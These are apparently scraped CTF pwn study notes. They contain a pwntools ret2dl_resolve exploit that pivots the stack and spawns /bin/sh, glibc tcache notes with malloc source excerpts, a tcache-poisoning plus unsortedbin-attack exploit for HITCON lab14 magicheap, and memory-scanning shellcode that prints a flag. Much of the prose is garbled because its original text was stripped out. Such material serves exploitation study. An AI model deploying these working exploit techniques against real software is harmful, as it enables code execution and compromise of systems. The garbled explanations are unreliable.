link_map libary .dynamic.dynamic(.dynsym .dynstr .rela.plt)reloc_argrela.pltread.dynsymreadElf32_Sym(Elf64_Sym)sym.dynstr+sym->st_nameread\x00_dl_lookup_symbol_xread@got

exp

# # io = remote('node4.buuoj.cn',26320)io = process('./bof')# io = gdb.debug('./bof')e = ELF('./bof')# libc = ELF('./')# gadgetwrite_plt = 0x80483C0vuln = 0x80484D6bss_addr = e.bss()pop_ebp = 0x804862bleave_ret = 0x8048445pop_ebx_esi_edi_ebp = 0x8048628# sectionplt0 = e.get_section_by_name('.plt').header.sh_addrrel_plt = e.get_section_by_name('.rel.plt').header.sh_addrdynsym = e.get_section_by_name('.dynsym').header.sh_addrdynstr = e.get_section_by_name('.dynstr').header.sh_addr# stack_size = 0x800base_stage = bss_addr + stack_sizefake_dynsym_addr = base_stage+32align = 0x10-((fake_dynsym_addr-dynsym)&0xf)fake_dynsym_addr += alignfake_dynstr_addr = fake_dynsym_addr+16st_name = fake_dynstr_addr - dynstrst_value = 0st_size = 0st_info = 0x12#24st_bindst_typefake_dynsym = p32(st_name)+p32(st_value)+p32(st_size)+p32(st_info)fake_rel_addr = base_stage+24reloc_arg = fake_rel_addr-rel_pltr_sym = (fake_dynsym_addr-dynsym)//0x10r_type = 0x7r_info = (r_sym << 8)+(r_type&0xff)r_offset = e.got['read']fake_rel = p32(r_offset)+p32(r_info)fake_dynstr = b'system\x00'# stack pivotio.recv()payload_migrate = flat(['a'*112,e.plt['read'],pop_ebx_esi_edi_ebp,0,base_stage,100,base_stage-4,leave_ret])io.send(payload_migrate)pause()# ret2dl_resolvebinsh_addr = base_stage+80payload = flat([plt0,reloc_index,'retn',binsh_addr,'arg1','arg2',fake_rel,'a'*align,fake_dynsym,fake_dynstr]).ljust(80,b'a')payload += b'/bin/sh\x00'payload +=(100-len(payload))*b'a'io.send(payload)io.interactive()

entry.title: Tcache
entry.content:
Tcache glibc 2.26 (ubuntu 17.10)
,Tcache(Unsortedbin Attak)TcacheTcache(glibc2.26-2.27)

1.Tcache

.
Tcachechunk0x410(1032)

2.Tcache


freetcache7tcachebinsfreebin

3.Tcachecounts

TcacheTcacheTcache.

TcacheTcache bincountstcache_count(7)Tcache.counts0Tcache,.

tcache_put

#if USE_TCACHE          /* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */          if (tcache_nb          && tcache->counts[tc_idx] < mp_.tcache_count)        {          tcache_put (victim, tc_idx);          return_cached = 1;          continue;        }          else        {#endif              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;#if USE_TCACHE        }

elseTcache

if (tcache_nb          && tcache->counts[tc_idx] < mp_.tcache_count)


tcache_perthread_structchar counts

typedef struct tcache_perthread_struct{  char counts[TCACHE_MAX_BINS];  tcache_entry *entries[TCACHE_MAX_BINS];} tcache_perthread_struct;

glibcmp_.tcache_countmp_.tcache_countsize_tsize_t

do_set_tcache_count (size_t value){  LIBC_PROBE (memory_tunable_tcache_count, 2, value, mp_.tcache_count);  mp_.tcache_count = value;  return 1;}

countscharmp_.tcache_countsize_tcounts
counts
tcache_getcountsTcachechunkTcachecounts

tcache_get (size_t tc_idx){  tcache_entry *e = tcache->entries[tc_idx];  assert (tc_idx < TCACHE_MAX_BINS);  assert (tcache->entries[tc_idx] > 0);  tcache->entries[tc_idx] = e->next;  --(tcache->counts[tc_idx]);  return (void *) e;}

Tcache Poisoning(Tcachechunk,Tcachesize,)
Tcache

glibc2.26-2.27tcache_getassert

tcache_get (size_t tc_idx){  tcache_entry *e = tcache->entries[tc_idx];  assert (tc_idx < TCACHE_MAX_BINS);  //counts  //assert(tcache->counts[tc_idx]>0);  assert (tcache->entries[tc_idx] > 0);  tcache->entries[tc_idx] = e->next;  --(tcache->counts[tc_idx]);  return (void *) e;}

glibc2.28

,

HITCON Training lab14 magic heap

  1. edit_heapsize
  2. bssmagic>4869

    Unsortedbin Attackmagic
exp
io = process('./magicheap')magic_addr = 0x6020C0def create(size,content):    io.sendlineafter(':','1')    io.sendlineafter(':',str(size))    io.sendafter(':',content)    def edit(idx,size,content):    io.sendlineafter(':','2')    io.sendlineafter(':',str(idx))    io.sendlineafter(':',str(size))    io.sendafter(':',content)def delete(idx):    io.sendlineafter(':','3')    io.sendlineafter(':',str(idx))def magic():    io.sendlineafter(':','4869')create(0x20,'a'*8)create(0x80,'a'*8)delete(1)tcache_poisoning = b'a'*0x28 + p64(0x91) + p64(0x602200)edit(0,len(tcache_poisoning),tcache_poisoning)  create(0x80,'aaaa')create(0x80,'aaaa')#Tcachecounts-1  create(0x20,'bbbb') # top chunk#Unsortedbin Attackdelete(1)edit(0,0x40,b'a'*0x28+p64(0x91)+p64(0)+p64(magic_addr-0x10))create(0x80,'aaaa') magic()io.interactive()

    wp

    ```python
    sc =
    lea rsp, [rip+0x500]
    lea r13, [rip]
    mov r14, 0xfffffff00000
    and r13, r14 # r13
    loop:
    add r13, 0x1000
    pop r14 #pushr13
    pop r14
    push 0x1 #writeviovec1iov_len
    push r13
    mov rdi, 2
    mov rsi, rsp
    mov rdx, 1
    mov rcx, 0
    mov rax, 20
    syscall
    cmp rax, 0 #writev
    jl loop #
    mov rdi, [r13]
    cmp edi, 0x54435354 #TSCT
    jnz loop
    push 31
    push r13
    mov rdi, 2
    mov rsi, rsp
    mov rdx, 1
    mov rcx, 0
    mov rax, 20
    syscall #flag
    jmp $

```
